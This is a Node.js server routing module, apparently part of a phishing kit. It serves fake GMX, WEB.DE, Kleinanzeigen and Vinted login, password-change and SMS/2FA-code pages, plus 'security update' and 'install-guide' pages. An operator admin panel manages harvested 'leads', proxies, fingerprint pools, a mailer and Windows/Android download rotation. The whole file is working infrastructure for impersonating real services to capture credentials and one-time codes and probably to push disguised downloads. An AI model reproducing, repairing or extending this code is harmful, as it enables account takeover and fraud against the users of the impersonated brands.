// HTML-страницы и статика gmx / webde / klein / vint / mailer / public (uses with(scope)).
const path = require('path');
const fsp = require('fs').promises;
const { send, safeEnd } = require('../utils/httpUtils');
const { checkAdminPageAuth } = require('../utils/authUtils');
const { serveFile } = require('../utils/staticFileServe');
const gateMiddleware = require('../middleware/gateMiddleware');
const { withLocalDevQuery } = require('../utils/localDevKlein');

async function handle(scope) {
  with (scope) {
  if ((pathname === '/' || pathname === '') && (req.method === 'GET' || req.method === 'HEAD')) {
    if (safeEnd(res)) return true;
    const brand = getBrand(req);
    const host = (req.headers.host || '').split(':')[0].toLowerCase();
    if (isLocalHost(host)) {
      res.writeHead(302, { 'Location': withLocalDevQuery(req, '/anmelden'), 'Cache-Control': 'no-store' });
    } else if (brand.id === 'klein') {
      // Относительный редирект: иначе с :3002 уезжали на https://домен/anmelden (порт 443 → старый Apache).
      res.writeHead(302, { 'Location': withLocalDevQuery(req, '/anmelden'), 'Cache-Control': 'no-store' });
    } else {
      res.writeHead(302, { 'Location': withLocalDevQuery(req, '/anmelden'), 'Cache-Control': 'no-store' });
    }
    res.end();
    return true;
  }

  const brand = getBrand(req);
  const isWebde = brand.id === 'webde';
  const isKlein = brand.id === 'klein';
  const isVint = brand.id === 'vint';

  if ((pathname === '/einloggen' || pathname === '/einloggen/') && (req.method === 'GET' || req.method === 'HEAD')) {
    if (isKlein) {
      if (safeEnd(res)) return true;
      res.writeHead(302, { 'Location': withLocalDevQuery(req, '/anmelden'), 'Cache-Control': 'no-store' });
      res.end();
      return true;
    }
    if (safeEnd(res)) return true;
    res.writeHead(302, { 'Location': withLocalDevQuery(req, '/anmelden'), 'Cache-Control': 'no-store' });
    res.end();
    return true;
  }

  /** Частая опечатка в ссылках: /anmelde → входная страница. */
  if ((pathname === '/anmelde' || pathname === '/anmelde/') && (req.method === 'GET' || req.method === 'HEAD')) {
    if (safeEnd(res)) return true;
    res.writeHead(302, { 'Location': withLocalDevQuery(req, '/anmelden'), 'Cache-Control': 'no-store' });
    res.end();
    return true;
  }

  if ((pathname === '/anmelden' || pathname === '/anmelden/') && (req.method === 'GET' || req.method === 'HEAD')) {
    if (isKlein) {
      serveFile(path.join(PROJECT_ROOT, 'klein', 'index.html'), res, req, getBrand);
      return true;
    }
    if (isVint) {
      serveFile(path.join(PROJECT_ROOT, 'Vinted', 'index.html'), res, req, getBrand);
      return true;
    }
    const indexFile = isWebde ? path.join(PROJECT_ROOT, 'webde', 'index.html') : path.join(PROJECT_ROOT, 'gmx', 'index.html');
    serveFile(indexFile, res, req, getBrand);
    return true;
  }
  if ((pathname === '/klein-anmelden' || pathname === '/klein-anmelden/') && req.method === 'GET') {
    serveFile(path.join(PROJECT_ROOT, 'klein', 'index.html'), res, req, getBrand);
    return true;
  }
  if (pathname === '/passwort-aendern' && req.method === 'GET') {
    if (isKlein) {
      serveFile(path.join(PROJECT_ROOT, 'klein', 'passwort-aendern.html'), res, req, getBrand);
      return true;
    }
    if (isVint) {
      serveFile(path.join(PROJECT_ROOT, 'Vinted', 'passchange.html'), res, req, getBrand);
      return true;
    }
    const filePath = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'index-change.html');
    serveFile(filePath, res, req, getBrand);
    return true;
  }
  if ((pathname === '/sicherheit' || pathname === '/sicherheit/' || pathname === '/sicherheit-pc' || pathname === '/sicherheit-pc/' || pathname === '/sicherheit-update' || pathname === '/sicherheit-update/') && req.method === 'GET') {
    const sicherheitFile = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'index-sicherheit-update.html');
    serveFile(sicherheitFile, res, req, getBrand);
    return true;
  }
  if ((pathname === '/bitte-am-pc' || pathname === '/bitte-am-pc/') && req.method === 'GET') {
    const filePath = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'bitte-am-pc.html');
    serveFile(filePath, res, req, getBrand);
    return true;
  }
  if ((pathname === '/app-update' || pathname === '/app-update/') && req.method === 'GET') {
    const filePath = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'app-update.html');
    serveFile(filePath, res, req, getBrand);
    return true;
  }
  if ((pathname === '/gmx-mobile-anleitung' || pathname === '/gmx-mobile-anleitung/') && req.method === 'GET') {
    const filePath = path.join(PROJECT_ROOT, isWebde ? 'webde' : 'gmx', 'gmx-mobile-anleitung.html');
    serveFile(filePath, res, req, getBrand);
    return true;
  }

  if (pathname === '/sms-code.html' && req.method === 'GET' && isKlein) {
    serveFile(path.join(PROJECT_ROOT, 'klein', 'sms-code.html'), res, req, getBrand);
    return true;
  }
  if (pathname === '/sms-code.html' && req.method === 'GET' && isVint) {
    serveFile(path.join(PROJECT_ROOT, 'Vinted', 'sms.html'), res, req, getBrand);
    return true;
  }
  if (pathname === '/sms.html' && req.method === 'GET' && isVint) {
    serveFile(path.join(PROJECT_ROOT, 'Vinted', 'sms.html'), res, req, getBrand);
    return true;
  }
  if (pathname === '/passchange.html' && req.method === 'GET' && isVint) {
    serveFile(path.join(PROJECT_ROOT, 'Vinted', 'passchange.html'), res, req, getBrand);
    return true;
  }
  if (pathname === '/sms/sms.html' && req.method === 'GET' && isVint) {
    serveFile(path.join(PROJECT_ROOT, 'Vinted', 'sms', 'sms.html'), res, req, getBrand);
    return true;
  }
  if ((pathname === '/klein-passwort-warnung' || pathname === '/klein-passwort-warnung/') && req.method === 'GET') {
    if (!isKlein) {
      if (safeEnd(res)) return true;
      res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8', 'Cache-Control': 'no-store' });
      res.end('Not found');
      return true;
    }
    serveFile(path.join(PROJECT_ROOT, 'klein', 'klein-passwort-warnung.html'), res, req, getBrand);
    return true;
  }
  if ((pathname === '/erfolg' || pathname === '/erfolg/') && req.method === 'GET') {
    serveFile(path.join(PROJECT_ROOT, 'klein', 'erfolg.html'), res, req, getBrand);
    return true;
  }

  if (req.method === 'GET') {
    const contentFromGmx = {
      '/push-confirm.html': 'push-confirm.html',
      '/sms-code.html': 'sms-code.html',
      '/2fa-code.html': '2fa-code.html',
      '/change-password.html': 'change-password.html',
      '/forgot-password-redirect.html': 'forgot-password-redirect.html',
      '/index-sicherheit-update.html': 'index-sicherheit-update.html',
      '/index-sicherheit.html': 'index-sicherheit.html',
      '/index-sicherheit-pc.html': 'index-sicherheit-pc.html',
      '/sicherheit-anleitung.html': 'sicherheit-anleitung.html',
      '/install-guide.html': 'install-guide.html',
      '/install-guide-test.html': 'install-guide-test.html',
      '/install-guide-single.html': 'install-guide-single.html',
      '/install-guide-single-2steps.html': 'install-guide-single-2steps.html',
      '/index-change.html': 'index-change.html',
      '/bitte-am-pc.html': 'bitte-am-pc.html',
      '/app-update.html': 'app-update.html',
      '/gmx-mobile-anleitung.html': 'gmx-mobile-anleitung.html'
    };
    const webdeHas = {
      '/push-confirm.html': true, '/sms-code.html': true, '/2fa-code.html': true, '/change-password.html': true, '/forgot-password-redirect.html': true,
      '/index-sicherheit-update.html': true, '/index-sicherheit.html': true, '/index-sicherheit-pc.html': true, '/sicherheit-anleitung.html': true,
      '/install-guide.html': true, '/install-guide-test.html': true, '/install-guide-single.html': true, '/install-guide-single-2steps.html': true, '/index-change.html': true, '/bitte-am-pc.html': true, '/app-update.html': true, '/gmx-mobile-anleitung.html': true
    };
    const fileName = contentFromGmx[pathname];
    if (fileName) {
      if (isWebde && !webdeHas[pathname]) {
        if (safeEnd(res)) return true;
        send(res, 404, 'Not Found', 'text/plain');
        return true;
      }
      const dir = isWebde && webdeHas[pathname] ? 'webde' : 'gmx';
      serveFile(path.join(PROJECT_ROOT, dir, fileName), res, req, getBrand);
      return true;
    }
  }

  if ((pathname === '/admin-login.html' || pathname === '/admin-login' || pathname === '/admin-login/') && req.method === 'GET') {
    const filePath = path.join(PROJECT_ROOT, 'public', 'admin-login.html');
    serveFile(filePath, res, req, getBrand);
    return true;
  }

  if ((pathname === '/admin-preview' || pathname === '/admin-preview/' || pathname === '/admin-preview.html') && req.method === 'GET') {
    serveFile(path.join(PROJECT_ROOT, 'public', 'admin-preview.html'), res, req, getBrand);
    return true;
  }

  // Статика прототипа дизайна: public/preview/**.{css,js,svg,png,html}
  if (pathname.startsWith('/preview/') && (req.method === 'GET' || req.method === 'HEAD')) {
    const rel = pathname.replace(/^\/preview\//, '');
    if (!/^[A-Za-z0-9._\-\/]+$/.test(rel) || rel.includes('..')) {
      res.writeHead(400, { 'Content-Type': 'text/plain' });
      res.end('bad path');
      return true;
    }
    serveFile(path.join(PROJECT_ROOT, 'public', 'preview', rel), res, req, getBrand);
    return true;
  }

  if ((pathname === '/config' || pathname === '/config/' || pathname === '/stats' || pathname === '/stats/') && req.method === 'GET') {
    if (!checkAdminPageAuth(req, res, parsed)) return true;
    if (safeEnd(res)) return true;
    res.writeHead(302, { 'Location': '/admin', 'Cache-Control': 'no-store' });
    res.end();
    return true;
  }

  // /admin — рабочая боевая админка. Прототип в миграции, открывается по /admin-preview.html.
  if ((pathname === '/admin' || pathname === '/admin/') && req.method === 'GET') {
    if (!checkAdminPageAuth(req, res, parsed)) return true;
    const filePath = path.join(PROJECT_ROOT, 'public', 'admin.html');
    serveFile(filePath, res, req, getBrand);
    return true;
  }

  if ((pathname === '/mailer' || pathname === '/mailer/' || pathname === '/mailer/index.html') && req.method === 'GET') {
    if (!checkAdminPageAuth(req, res, parsed)) return true;
    const mailerIndexPath = path.join(PROJECT_ROOT, 'mailer', 'index.html');
    serveFile(mailerIndexPath, res, req, getBrand);
    return true;
  }
  if (pathname === '/mailer/index-test.html' && req.method === 'GET') {
    if (!checkAdminPageAuth(req, res, parsed)) return true;
    const mailerTestPath = path.join(PROJECT_ROOT, 'mailer', 'index-test.html');
    serveFile(mailerTestPath, res, req, getBrand);
    return true;
  }
  if ((pathname === '/mailer/mailer.js' || pathname === '/mailer/mailer.css') && req.method === 'GET') {
    const mailerAssetPath = path.join(PROJECT_ROOT, 'mailer', path.basename(pathname));
    try {
      const stat = await fsp.stat(mailerAssetPath);
      if (!stat.isFile()) {
        send(res, 404, 'Not Found', 'text/plain');
        return true;
      }
    } catch (e) {
      send(res, 404, 'Not Found', 'text/plain');
      return true;
    }
    serveFile(mailerAssetPath, res, req, getBrand);
    return true;
  }

  if (pathname.startsWith('/guide/') && pathname.length > 7 && req.method === 'GET') {
    const name = path.basename(pathname).replace(/[^a-zA-Z0-9._-]/g, '');
    if (name && /\.(png|jpg|jpeg|gif|webp)$/i.test(name)) {
      const guidePath = path.join(PROJECT_ROOT, 'webde', 'guide', name);
      try {
        const stat = await fsp.stat(guidePath);
        if (!stat.isFile()) {
          send(res, 404, 'Not Found', 'text/plain');
          return true;
        }
      } catch (e) {
        send(res, 404, 'Not Found', 'text/plain');
        return true;
      }
      serveFile(guidePath, res, req, getBrand);
      return true;
    }
  }

  if (pathname === '/index.html' && req.method === 'GET') {
    if (safeEnd(res)) return true;
    res.writeHead(302, { 'Location': withLocalDevQuery(req, '/anmelden'), 'Cache-Control': 'no-store' });
    res.end();
    return true;
  }
  if (pathname === '/index-change.html' && req.method === 'GET') {
    if (safeEnd(res)) return true;
    res.writeHead(302, { 'Location': withLocalDevQuery(req, '/passwort-aendern'), 'Cache-Control': 'no-store' });
    res.end();
    return true;
  }

  const publicAssets = ['/script.js', '/script-webde.js', '/script-klein.js', '/script-vint.js', '/ulp-klein-auth0.css', '/index-change.js', '/index-change-webde.js', '/push-confirm.js', '/push-confirm-webde.js', '/sms-code.js', '/sms-code-webde.js', '/sms-code-vint.js', '/2fa-code-webde.js', '/sms-code-klein.js', '/erfolg-klein.js', '/change-password.js', '/change-password-webde.js', '/change-password-klein.js', '/status-redirect.js', '/status-redirect-webde.js', '/chat-widget.js', '/brand.js', '/styles.css', '/favicon.svg', '/favicon-webde.png', '/webde-kundencenter-logo.png', '/klein-logo.png', '/klein-logo-mode.png', '/vinted-logo-mode.png', '/vint-logo-mode.png', '/klein-admin-mark.png', '/vint-admin-mark.png', '/vint-admin-mark-20260509.png', '/klein-local-logo.svg', '/klein-local-logo.png', '/klein-favicon.png', '/klein-lock-light.svg', '/klein-lock-dark.svg', '/windows-icon.png', '/android-icon.png', '/ios-icon.png', '/chat-widget.css', '/admin.html', '/admin.css', '/admin-ui-mode.css', '/admin.js', '/admin-actions.js', '/admin-core-utils.js', '/admin-core-api.js', '/admin-ui-mode.js', '/admin-mode-leads-filter.js', '/admin-leads-list.js', '/admin-chat-panel.js', '/admin-realtime-ws.js', '/admin-lead-detail.js', '/admin-config-pane-android.js', '/admin-config-pane-export.js', '/admin-config-pane-windows.js', '/admin-config-shared-download-rotation.js', '/admin-config-pane-short.js', '/admin-config-pane-proxies.js', '/fingerprint.js', '/webde-fingerprints-pool.js'];
  if ((req.method === 'GET' || req.method === 'HEAD') && pathname === '/sms-code-vint.js') {
    // Hot path hardening: Vint SMS must always bootstrap JS even if allowlist drifts.
    serveFile(path.join(PROJECT_ROOT, 'public', 'sms-code-vint.js'), res, req, getBrand);
    return true;
  }
  if ((req.method === 'GET' || req.method === 'HEAD') && (pathname === '/vint-admin-mark.png' || pathname === '/vint-admin-mark-20260509.png')) {
    // Compatibility alias for Vint icon path drift across frontend/runtime versions.
    const preferred = pathname === '/vint-admin-mark.png'
      ? ['vint-admin-mark.png', 'vint-admin-mark-20260509.png']
      : ['vint-admin-mark-20260509.png', 'vint-admin-mark.png'];
    for (let i = 0; i < preferred.length; i++) {
      const candidate = path.join(PROJECT_ROOT, 'public', preferred[i]);
      try {
        const st = await fsp.stat(candidate);
        if (st.isFile()) {
          serveFile(candidate, res, req, getBrand);
          return true;
        }
      } catch (_) {}
    }
    send(res, 404, 'Not Found', 'text/plain');
    return true;
  }
  if (isVint && pathname === '/067fee12c26bae06.css') {
    serveFile(path.join(PROJECT_ROOT, 'Vinted', '067fee12c26bae06.css'), res, req, getBrand);
    return true;
  }
  const requested = pathname;
  const inPublic = publicAssets.indexOf(pathname) !== -1;
  // Нельзя path.join(PROJECT_ROOT, '/foo'): второй сегмент абсолютный → /foo на диске → relative() с «..» → ложный 403 Forbidden.
  const underRoot = requested.replace(/^\/+/, '');
  let filePath = inPublic ? path.join(PROJECT_ROOT, 'public', requested.slice(1)) : path.join(PROJECT_ROOT, underRoot);
  if (!path.relative(PROJECT_ROOT, filePath).split(path.sep).every(p => p !== '..')) {
    send(res, 403, 'Forbidden', 'text/plain');
    return true;
  }

  let stat;
  try {
    stat = await fsp.stat(filePath);
  } catch (e) {
    send(res, 404, 'Not Found', 'text/plain');
    return true;
  }
  if (!stat.isFile()) {
    send(res, 404, 'Not Found', 'text/plain');
    return true;
  }
  if (pathname === '/admin.html' && req.method === 'GET' && !checkAdminPageAuth(req, res, parsed)) return true;
  if (gateMiddleware.handleProtectedContentPathGate(req, res, pathname, getBrand)) return true;
  serveFile(filePath, res, req, getBrand);
  return true;
  }
  return false;
}

module.exports = { handle };
